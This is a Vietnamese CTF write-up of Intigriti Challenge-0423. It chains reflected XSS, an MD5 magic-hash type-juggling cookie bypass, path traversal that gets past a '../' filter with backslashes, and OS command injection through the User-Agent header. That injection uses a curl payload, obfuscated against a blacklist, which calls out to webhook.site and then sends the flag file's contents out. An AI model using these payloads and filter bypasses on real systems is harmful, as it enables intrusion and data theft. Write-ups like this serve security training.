# [Intigriti] Challenge-0423
<p>Đầu tiên, tại /challenge.php nhận về một giao diện trang login. Đề bài đã cho sẵn username=strange và password=monkey để login. Sau khi login, server trả về 2 cookie là username và account_type rồi chuyển hướng về /dashboard.php.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image.png)

<p>Thay đổi cookie username và account_type bằng cách giá trị khác nhau nhưng không có dấu hiệu gì đặc biệt ở response.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-1.png)

<p>Kiểm tra các thư mục có listing hay không? Kết quả là không được phép truy cập và qua việc này thì phát hiện ra được thông tin web server là nginx/1.24.0. Bây giờ, có 2 hướng để đi tiếp là thử các payload SQL injection ở chức năng login hoặc là tìm các lỗi nằm trên nginx/1.24.0. Tạm thời ưu tiên test chức năng login trước.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-2.png)

<p>Sử dụng kí tự ' thì server trả về response yêu cầu điều hướng tới /index_error.php?error=invalid username or password.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-3.png)

<p>Sau đó, nhận được response có một dòng comment "Nhớ sử dụng strict comparison" -> Có vẻ như đây là gợi ý trang web bị lỗi type juggling. Các vị trí có khả năng bị type juggling có thể xảy ra là login, cookie. Điều đáng chú ý là giá trị của tham số error có vẻ như được render trực tiếp ra HTML response -> Có khả năng bị XSS.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-4.png)

<p>Thử &lth1&gta thì xác định HTML injection thành công.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-5.png)

<p>Thử &ltscript&gtalert(origin)&lt/script&gt thì xác định đúng trang web này đã bị XSS.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-6.png)

<p>Quay về trang login, mình có thắc mắc là server có nhận dữ liệu dưới dạng nào khác ngoài form không ? (ví dụ như là json, xml,...). Sau khi đổi định dạng là json và gửi đi thì phát hiện ra có vẻ như trang này chưa tắt cấu hình display_errors dẫn đến hiển thị waring ở phía client. Dựa vào warning thì xác định được 2 điều: không nhận dữ liệu json khi login và đường dẫn tới trang login là /app/login.php. Vì không nhận dữ liệu json nên giả thuyết sử dụng "psw": true là coi như loại -> Khả năng bị type juggling còn lại là nằm trong cookie.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-7.png)

<p>Giá trị của cookie account_type khá đặc biệt, là một chuỗi không rõ có ý nghĩa gì và khi thay đổi thì response cũng không có dấu hiệu gì đặc biệt. Dựa vào tên "account_type" thì mình đoán có thể giá trị là một mã để phân biệt các loại tài khoản (VIP, Normal,...). Có thể là các giá trị sẽ được hash, encrypt,... để so sánh với giá trị nào đó ở phía server. Liên quan đến hash thì trong type juggling có các chuỗi được gọi là magic hash. Ý tưởng bây giờ là thử các hash phổ biến như MD5, SHA1,.. Tìm chuỗi sau khi hash MD5 có dạng 0e... -> Chọn "etqaTTFXeujI" và response trả về có một element khá đặc biệt. Dựa vào tiêu đề &lt;h3 id=&quot;custom_image.php - try to catch the flag.txt ;)&quot;&gt;A special golden wall just for Premium Users ;) &lt;/h3&gt; có thể đoán rằng truy cập đến /custom_image.php để tìm flag.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-8.png)

<p>Tại /custom_image.php, browser render ra một image là một bức tường màu vàng. Dựa vào tên file thì khả năng cao là endpoint này xử lý gì đó rồi mới trả về nội dung tấm ảnh chứ sử dụng file .php chỉ trả về nội dung ảnh thì không hợp lí cho lắm. Tại vì, hầu hết những ảnh trên trang web này đều được lưu tập trung trong các thư mục cụ thể như là resources hoặc images. Bây giờ, có 2 hướng để tiếp tục là fuzz các parameter tại /custom_image.php hoặc là đi tìm bí mật nào đó được giấu trong ảnh này</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-9.png)

<p>Sử dụng một số tools: exiftool, steghide,... thì kết quả cũng không có gì đáng chú ý -> Hướng này có vẻ fail</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-10.png)

<p>Quay lại hướng thứ nhất, sử dụng ffuf để fuzz parameter. Vì trong lần fuzz đầu tiên có khá nhiều kết quả có cùng kích thước nên tạm thời filter các response có cùng size -> Kết quả tìm được một parameter là file.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-11.png)

<p>Chưa rõ là tham số file này yêu cầu giá trị là gì. Có thể là đường dẫn tương đối hoặc tuyệt đối. Tuy nhiên, vì đã biết là trang này sẽ hiển thị các warning và error nên mình sẽ cố gắng thử các trường hợp gây ra error/warning để leak thêm thông tin. Thử truyền tham số với kiểu array thì gây ra lỗi thành công. Dựa vào stack trace: lỗi bắt đầu từ dòng code thứ 12 khi sử dụng strpos(Array, "../") -> mình đoán tham số đầu tiên của hàm strpos là biến nhận giá trị của tham số file vì tôi đã truyền vào một mảng nên bị lỗi là đúng và tham số thứ hai là "../" -> Có vẻ như dòng code này dùng để kiểm tra chuỗi "../" gây path traversal trong giá trị của tham số file.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-12.png)

<p>Sử dụng một đường dẫn tuyệt đối có sẵn trên web để test. Kết quả là hiển thị một thông báo lỗi leak ra file_get_content và đọc nội dung từ đường dẫn lấy từ tham số file.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-13.png)

<p>Thử thêm chuỗi "../" thì bị replace đi -> Có vẻ như strpos ở dòng 12 sẽ tìm chuỗi "../" và sau đó thực hiện replace rồi mới đưa vào hàm file_get_content. Chưa rõ là việc replace này có lặp lại nhiều lần hay không nên cần phải test thêm.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-14.png)

<p>Chèn thêm các chuỗi "../" vào giữa thì tất cả đều đã bị replace -> Hướng sử dụng "../" có vẻ fail. Tuy nhiên, nếu server sử dụng hệ điều hành Windows thì vẫn còn một cách khác. Đó là sử dụng kí tự \ thay vì /.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-15.png)

<p>Vậy là thành công bypass việc kiểm tra "../" bằng cách sử dụng "..\"</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-16.png)

<p>Tuy nhiên, sử dụng bao nhiêu "..\" cũng không tìm thấy flag.txt -> Có vẻ như thư mục www nằm trong thư mục chứa mã nguồn của trang web chứ không phải nằm trong thư mục gốc</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-17.png)

<p>Thay thế bằng www/web/images/ và thử lại -> Thành công</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-18.png)

<p>Chuyển đổi kiểu dữ liệu thành text/plain để xem nội dung gốc. Có vẻ nội dung gợi ý truy cập đến /e7f717ed-d429-4d00-861d-4137d1ef29az/9709e993-be43-4157-879b-78b647f15ff7/admin.php.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-19.png)

<p>Tương tự, ra được nội dung admin.php. Có một dòng code sử dung shell_exec nhận giá trị từ trường User-Agent trên HTTP Header -> Khả năng bị OS Command injection. Nhìn chung thì việc sử dụng blacklist và sau đó replace trong trường này vẫn bypass được. Thứ nhất, blacklist vẫn thiếu  các kí tự như: ` $ ( ) . Thứ hai, việc replace các chuỗi khớp với phần trong blacklist thì hợp lí với các ký tự lẻ còn với từ 2 kí tự khác nhau trở lên thì hoàn toàn có thể chèn thêm chuỗi ở giữa để bypass.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-20.png)

<p>Đầu tiên, sử dụng payload: `cucurlrl${IFS}https://webhook.site/7d182ba8-11b7-405f-bcdd-ad2ad82e6254` để xem thực sự có tồn tại lệnh curl và server có được phép kết nối ra ngoài internet hay không. Có request gửi tới webhook -> Curl thành công. Tiếp theo, để leak data ra ngoài bằng lệnh curl thì có thể truyền qua tham số hoặc dùng data-binary . Tuy nhiên, cách sử dụng data-binary có vẻ không khả thi.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-21.png)

<p>Ban đầu, khi sử dụng cat để đọc nội dung flag.txt thì nội dung trả về là rỗng. Có vẻ như tên file chứa flag không phải là flag.txt nên thay vào đó mình sử dụng kí tự * để đọc file .txt. -> Lấy được flag thành công.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-22.png)

<p>Tóm lại, đây là toàn bộ nội dung về challenge. Hy vọng writeup này giúp ích cho bạn 🔥.</p>
